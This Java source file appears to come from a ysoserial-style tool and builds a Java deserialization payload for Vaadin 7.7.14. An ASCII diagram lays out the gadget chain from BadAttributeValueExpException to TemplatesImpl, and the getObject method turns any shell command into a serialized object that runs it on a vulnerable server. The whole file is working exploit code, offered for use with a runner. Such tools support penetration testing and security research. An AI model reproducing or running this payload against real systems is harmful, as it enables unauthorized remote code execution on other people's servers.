package dogeser.payloads;

import javax.management.BadAttributeValueExpException;

import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.annotation.PayloadTest;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.JavaVersion;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;

@Dependencies( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
@PayloadTest( precondition = "isApplicableJavaVersion")
@dogeser.payloads.annotation.Authors({ Authors.KULLRICH })
public class Vaadin1 implements ObjectPayload<Object>
{
//  +-------------------------------------------------+
//  |                                                 |
//  |  BadAttributeValueExpException                  |
//  |                                                 |
//  |  val ==>  PropertysetItem                       |
//  |                                                 |
//  |  readObject() ==> val.toString()                |
//  |          +                                      |
//  +----------|--------------------------------------+
//             |
//             |
//             |
//        +----|-----------------------------------------+
//        |    v                                         |
//        |  PropertysetItem                             |
//        |                                              |
//        |  toString () => getPropertyId().getValue ()  |
//        |                                       +      |
//        +---------------------------------------|------+
//                                                |
//                  +-----------------------------+
//                  |
//            +-----|----------------------------------------------+
//            |     v                                              |
//            |  NestedMethodProperty                              |
//            |                                                    |
//            |  getValue() => java.lang.reflect.Method.invoke ()  |
//            |                                           |        |
//            +-------------------------------------------|--------+
//                                                        |
//                    +-----------------------------------+
//                    |
//                +---|--------------------------------------------+
//                |   v                                            |
//                |  TemplatesImpl.getOutputProperties()           |
//                |                                                |
//                +------------------------------------------------+

    @Override
    public Object getObject (String command) throws Exception
    {
        Object templ = Gadgets.createTemplatesImpl (command);
        PropertysetItem pItem = new PropertysetItem ();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
        pItem.addItemProperty ("outputProperties", nmprop);

        BadAttributeValueExpException b = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (b, "val", pItem);

        return b;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Vaadin1.class, args);
    }

}
